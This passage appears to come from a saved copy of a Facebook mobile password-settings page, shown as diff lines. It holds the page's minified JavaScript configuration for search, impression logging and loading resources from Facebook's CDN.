ResultsButton"},"TypedResult":{"__m":"MSearchSimplificationTypedResult"},"Header":{"__m":"MSearchSimplificationHeader"}},"behaviors":[{"__m":"MSearchTabsAboveBEM"},{"__m":"MSearchBootstrapEntityModule"}]}]]],"define":[["SearchMTouchGlobalOptions",[],{"enableSeeMore":true,"enableQueryThrottle":true,"queryThrottleTime":125,"queryWaitTime":125,"enableEagerSendRequest":true,"useBanzaiLogging":false,"redirectPages":false,"noSnippet":false,"defaultNumTopResultsToShow":3,"useNewTypeaheadPerfLogger":true,"keywordsOnlyEnabled":true,"prefixMatchEntityBootstrap":true,"disableHighlighting":false},344],["MBootstrapCacheMaxCacheTime",[],{"maxCacheTimeByKey":{"typeahead_facebar3":604800000,"typeahead_search_bem3":604800000}},2886],["MViewableImpressionConfig",[],{"bypass_banzai_check":true,"handleAllHiddenEvents":true,"handleAllVisibleEvents":true,"minOffsetVisibleFromTop":0,"minOffsetVisibleFromBottom":0,"timeout":100,"cacheTrackedElements":true,"doHeatmapLogging":false,"heatmapLoggingDurationMS":null,"impressionURL":"\/xti.php","nonviewableEnabled":false,"is_xtrackable":true,"forceInstreamLoggingOnPlay":true,"minOffsetVisibleFromLeft":20,"minOffsetVisibleFromRight":20},436],["SearchEntityModuleServerConstants",[],{"TYPE_TO_BROWSE_TYPE":{"user":"browse_type_user","page":"browse_type_page","group":"browse_type_group","application":"browse_type_application","place":"browse_type_place","event":"browse_type_event"},"TYPE_TO_SERP_PATH":{"user":"\/search\/people\/","page":"\/search\/pages\/","group":"\/search\/groups\/","application":"\/search\/apps\/","place":"\/search\/places\/","event":"\/search\/events\/"},"RESULT_TYPE_TO_MODULE_ROLE":{"user":"ENTITY_USER","page":"ENTITY_PAGES","group":"ENTITY_GROUPS","application":"ENTITY_APPS","place":"ENTITY_PLACES","event":"ENTITY_EVENTS"},"TYPE_TO_DISPLAY_STYLE":{"user":"user_row","page":"page_row","group":"group_row","application":"app_row","place":"place_row","event":"event_row"},"WWW_GRAPH_SEARCH_RESULTS_TRACKABLE_CODE":"21.","SEARCH_RESULTS_TRACKABLE":"12.","SEE_MORE_LOGGING":{"MODULE_FOOTER_ITEM_TYPE":"module_footer","MODULE_HEADER_ITEM_TYPE":"module_header"},"BROWSE_RESULTS_PAGE_REF":"br_rs","RESULT_TYPE_TO_BROWSE_EDGE":{"user":"keywords_users","page":"keywords_pages","group":"keywords_groups","application":"keywords_apps","place":"keywords_places","event":"keywords_events"},"MTOUCH_BEM_CLICK_TYPE":"result","SERP_SESSION_ID":"ssid","BROWSE_EDGE_KEYWORDS_SEARCH":"keywords_search","MTOUCH_SEARCH_REFID":46,"BROWSE_NAV_SOURCE_CONTENT_FILTERS":"content_filter","BROWSE_NAV_SOURCE_SEE_MORE":"see_more","BROWSE_NAV_SOURCE_HEADER_SEE_ALL":"header_see_all","BROWSE_CALL_SITE_INIT_RESULT_SET":"browse_ui:init_result_set"},2764],["SearchMSiteTrackableClientViewConfig",[],{"enabled":true,"pixel_in_percentage":70,"duration_in_ms":2000,"subsequent_gap_in_ms":500,"log_initial_nonviewable":true,"should_batch":true,"require_horizontally_onscreen":false,"should_log_viewability_duration":true},2735],["MSearchBootstrapEntityModuleSettings",[],{"bootstrapSource":"\/typeahead\/search\/facebar\/bootstrap\/","bootstrapKey":"search_bem3","maxBootstrapResults":3},2342],["SearchResultPageExperiments",[],{"useUncachedBootstrapEntityModulePictures":true,"removeNonAdjacentBEMModuleRole":true},2790],["AdImpressionLoggingConfig",[],{"blockInvisible":true,"enableDelayedHiddenCheck":false,"disableActualCheck":false,"checkWholeAdUnit":false,"maxHiddenCheckDelay":5000,"logForHiddenAds":true},2166]]},"onload":"","onafterload":"","scheduledMarkupIndex":0,"templateContainer":"static_templates","templates":{"__html":""},"ixData":\{},"gkxData":{"AT6rZEzUcyBWoOb4V2g-69P-uTYCBQOV4MAneTkLEODU5AmB1XQLNE7GDpxllICAXZa-FMvUi03ToWCvMn-ywTDx":{"result":false,"hash":"AT4FeAgcErTwaiif"},"AT7lRNSvv5EvGMuc3qVyuEm6B5fx-wiQM2ULDCbypxprax0mO6oqX7RtrS3jr3DVy5zZveUFf1UNWCcFGWRnQWgb":{"result":false,"hash":"AT5sfB8ZLh5eRMI_"}},"resource_map":{"3TG8R":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iw-T4\/yO\/l\/en_US\/P4_8a0qRL43.js","crossOrigin":1},"onsIi":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3iTcE4\/y3\/l\/en_US\/PdgFu4G07LD.js","crossOrigin":1},"wF2f0":{"type":"js","src":"https:\/\/static.xx.fbcdn.net\/rsrc.php\/v3\/y4\/r\/4FczQSybngY.js","crossOrigin":1}},"bootloadable":\{},"type":"chrome"},"displayResources":[],"normalResources":["3TG8R","onsIi","wF2f0"],"content":{"__html":"\u003Cdiv class=\"_a-5\" id=\"u_0_x\">\u003C\/div>"}}, function() {require("NavigationMetrics").postPagelet(false, "m:chrome:schedulable-graph-search", "6562178793502791465-0");});
+  </script>
+  <script id="u_0_11">
+   require("Bootloader").setResourceMap(\{});
+  </script>
+  <script id="u_0_10">
+   require("MRenderingScheduler").getInstance().setPageletCount(1);require("NavigationMetrics").setPage({"page":"XSecuritySettingsPasswordController","page_type":"normal","page_uri":"https:\/\/touch.facebook.com\/settings\/security\/password\/","serverLID":"6562178793502791465-0"});require("TimeSlice").guard(function() {(require("ServerJSDefine")).handleDefines([]);new (require("ServerJS"))().handle(\{});}, "ServerJS define", {"root":true})();require("TimeSlice").guard(function() {(require("ServerJSDefine")).handleDefines([]);new (require("ServerJS"))().handle(\{});}, "ServerJS define", {"root":true})();
+  </script>
+ </body>
+</html>
